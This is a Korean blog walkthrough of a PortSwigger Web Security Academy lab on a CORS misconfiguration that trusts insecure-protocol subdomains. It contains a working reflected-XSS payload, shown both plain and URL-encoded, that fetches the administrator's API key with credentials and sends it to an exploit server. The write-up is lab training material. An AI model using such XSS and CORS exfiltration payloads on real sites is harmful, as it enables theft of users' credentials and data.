---
layout: post
title: "Burp Academy-CORS 취약점: CORS vulnerability with trusted insecure protocols"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, CORS취약점]
toc: true
---

# 개요
- [CORS]({% post_url 2023-06-28-CORS-basic %})에 관련된 취약점이다. 
- CORS 취약점에 대한 설명은 [여기]({% post_url 2023-06-27-burp-academy-cors %}) 
- 문제 주소: : https://portswigger.net/web-security/cors/lab-breaking-https-attack
- 난이도: PRACTITIONER (보통)


# 문제설명
- 서버에는 프로토콜에 관계없이 모든 서브도메인을 허용해주는 CORS 취약점이 있다. 
- 이 취약점을 이용해서 서버 관리자의 API Key를 얻어내는 자바스크립트 코드를 exploit server를 이용해서 서버로 보낸다. 
- 얻어낸 서버 관리자의 API Key를 제출하면 문제가 풀린다. 

```
This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이 

이번에는 http 통신을 도청해서 내용을 얻어내야 한다. 

## CORS 취약점이 있는 곳 찾기 
이번에도 우선 `GET /accountDetails` 요청을 테스트해본다. 
Origin헤더에는 특정 값(문제서버 도메인) 밖에 허용하지 않는다. 대신 HTTP도 허용해준다. 

![Origin헤더테스트](/images/burp-academy-cors-3-1.png)

HTTP 통신이므로 MITM만 할 수 있다면 요청이나 응답을 변조해서 데이터를 훔칠수도 있을 것 같다. 

그러나 어떻게 MITM을 할 수 있을까? 이거는 모르겠다...힌트를 본다. 

힌트는 다음과 같이 되어 있다. 랩 환경에서 MITM은 불가능하므로 대체 방법을 찾아야 한다고 한다. 이 대처방법은 서브도메인(문제 서버)에 Javascript를 주입하는 것이라고 하는데... XSS가 가능한 포인트가 있다면 Javascript주입은 가능할 것이다. 그런데 이 것과 HTTP 통신을 도청하는 것과 무슨 상관이 있지? 

```
If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.
```

## 풀이 방법 생각 
생각해본다 .이번 문제 서버의 CORS 설정은 오리진이 고정되어 있다. 즉, 문제서버 도메인만 허용하기 때문에 문제 서버에서 의도적으로 HTTP 요청을 보내도록 해야한다. 이 때문에 Javascript 인젝션이 필요하다고 생각된다. 

이 Javascript에서 해야하는 일을 생각해보자. 
- API Key를 획득하는 HTTP요청을 보낸다. 
- 이 요청의 응답에 포함되어 있는 API Key를 GET 파라메터로 포함한 요청을 exploit서버로 보낸다. 

다음과 같은 형태가 될 것이다. 

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://{문제서버서브도메인}.web-security-academy.net/accountDetails',true); // HTTP통신
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-{exploit서버서브도메인}.exploit-server.net/exploit?key='+this.responseText;
};
```


## Javascript 인젝션(XSS) 가능한 곳 찾기 

https://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net/?productId=1%22/%3E%3Cscript%3Ealert(1);%3C/script%3E&storeId=1 에서 찾았다. 

![XSS가능한 곳 찾기](/images/burp-academy-cors-3-2.png)


## 공격 페이로드 만들기 및 테스트 
Burp Decoder를 사용해서 다음 자바스크립트 코드를 URL인코딩한다. 

```js
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://0a2f00bf046394898574bcc600fa000f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-0a0f005e04c7943b8573bb22010f0047.exploit-server.net/exploit?key='+this.responseText;
};
</script>
```

URL인코딩하면 다음처럼된다. exploit서버에서 victim이 이 요청을 실행하도록 만들면 된다. 

```
https://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%3a%2f%2f%30%61%32%66%30%30%62%66%30%34%36%33%39%34%38%39%38%35%37%34%62%63%63%36%30%30%66%61%30%30%30%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%30%66%30%30%35%65%30%34%63%37%39%34%33%62%38%35%37%33%62%62%32%32%30%31%30%66%30%30%34%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1
```

일단 이 코드가 제대로 동작하는지 확인해본다. 

브라우저에서 위 코드를 테스트해보면 다음과 같이 HTTPS통신중에 HTTP를 요청했다고 거부된다. 처음부터 HTTP통신이어야 하는 것 같다. 

![테스트1](/images/burp-academy-cors-3-3.png)

위의 URL의 프로토콜부분을 http로 변경해서 다시 테스트해본다. 위의 에러는 없어졌다. 그러나 이번에는 CORS에러가 발생했다. 

```
http://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%3a%2f%2f%30%61%32%66%30%30%62%66%30%34%36%33%39%34%38%39%38%35%37%34%62%63%63%36%30%30%66%61%30%30%30%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%30%66%30%30%35%65%30%34%63%37%39%34%33%62%38%35%37%33%62%62%32%32%30%31%30%66%30%30%34%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1
```

![테스트2](/images/burp-academy-cors-3-4.png)

에러 메세지는 다음과 같다. 서버측에서 Access-Control-Allow-Origin헤더를 회신해주지 않는 것 같다. 

```
Access to XMLHttpRequest at 'http://0a2f00bf046394898574bcc600fa000f.web-security-academy.net/accountDetails' from origin 'http://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

GET /accountDetails HTTP요청을 확인해보면 다음과 같이 Origin 헤더가 설정되어 있는 것을 확인할 수 있었다. 

![CORS에러확인](/images/burp-academy-cors-3-5.png)

동일한 값으로 Burp Repeater에서 테스트해보면 다음과 같이 Access-Control-Allow-Origin헤더가 잘 회신되는 것을 확인할 수 있었다. 두 요청 사이에 뭐가 다른걸까? 

![Burp에서 CORS테스트](/images/burp-academy-cors-3-6.png)

브라우저에서 발생하는 통신을 Burp Proxy로 캡쳐해보니 원인을 알았다. GET /accountDetails 요청이 HTTP여서 발생하는 문제였다. 

![Burp에서 CORS테스트2](/images/burp-academy-cors-3-7.png)

페이로드의 GET요청 프로토콜부분을 다음과 같이 https로 변경한다. 그리고 URL인코딩해서 다시 테스트해본다. 

```js
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a2f00bf046394898574bcc600fa000f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-0a0f005e04c7943b8573bb22010f0047.exploit-server.net/exploit?key='+this.responseText;
};
</script>
```

이번에는 되는 것을 확인했다. 

```
http://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%32%66%30%30%62%66%30%34%36%33%39%34%38%39%38%35%37%34%62%63%63%36%30%30%66%61%30%30%30%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%30%66%30%30%35%65%30%34%63%37%39%34%33%62%38%35%37%33%62%62%32%32%30%31%30%66%30%30%34%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1
```

## exploit 서버 구성 및 공격 실행 

exploit서버의 Body부분을 다음과 같이 구성한다. 

```
<script>
location=http://stock.0a2f00bf046394898574bcc600fa000f.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%32%66%30%30%62%66%30%34%36%33%39%34%38%39%38%35%37%34%62%63%63%36%30%30%66%61%30%30%30%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%30%66%30%30%35%65%30%34%63%37%39%34%33%62%38%35%37%33%62%62%32%32%30%31%30%66%30%30%34%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1
</script>
```

그리고 저장한 후 Deliver To Victim버튼을 누른다. 그리고 접근 로그를 확인해보면 다음과 같이 관리자의 접근 로그가 보인다! 

![exploit서버 접근 로그](/images/burp-academy-cors-3-8.png)

관리자의 접근 로그에서 API Key부분만 얻어와서 문제 서버에 제출하면 문제가 풀린다. 


![풀이 성공](/images/burp-academy-cors-3-success.png)
